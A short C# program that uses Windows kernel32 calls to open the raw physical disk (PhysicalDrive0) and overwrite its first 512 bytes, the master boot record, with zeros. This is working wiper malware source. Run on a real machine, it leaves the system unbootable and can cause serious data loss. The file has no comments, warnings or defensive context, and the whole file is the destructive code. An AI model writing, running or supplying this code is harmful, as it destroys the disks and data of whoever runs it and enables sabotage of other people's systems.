using System;
using System.Runtime.InteropServices;
using System.Threading;
using Microsoft.Win32.SafeHandles;
using System.IO;
using System.Security.AccessControl;

class Program
{
    private static readonly byte[] MasterBootRecord = new byte[512];

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    static extern SafeFileHandle CreateFile(
        string lpFileName,
        uint dwDesiredAccess,
        uint dwShareMode,
        IntPtr lpSecurityAttributes,
        uint dwCreationDisposition,
        uint dwFlagsAndAttributes,
        IntPtr hTemplateFile);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool WriteFile(
        SafeFileHandle hFile,
        byte[] lpBuffer,
        uint nNumberOfBytesToWrite,
        out uint lpNumberOfBytesWritten,
        IntPtr lpOverlapped);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool CloseHandle(IntPtr hObject);

    const uint GENERIC_ALL = 0x10000000;
    const uint FILE_SHARE_READ = 0x00000001;
    const uint FILE_SHARE_WRITE = 0x00000002;
    const uint OPEN_EXISTING = 3;

    static uint Mbr(IntPtr lpParam)
    {
        using (SafeFileHandle hFile = CreateFile(@"\\.\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, IntPtr.Zero, OPEN_EXISTING, 0, IntPtr.Zero))
        {
            if (!hFile.IsInvalid)
            {
                uint bytesWritten;
                WriteFile(hFile, MasterBootRecord, (uint)MasterBootRecord.Length, out bytesWritten, IntPtr.Zero);
            }
        }
        return 0;
    }

    static void Main()
    {
        Thread thread = new Thread(() => Mbr(IntPtr.Zero));
        thread.Start();
        thread.Join();
    }
}
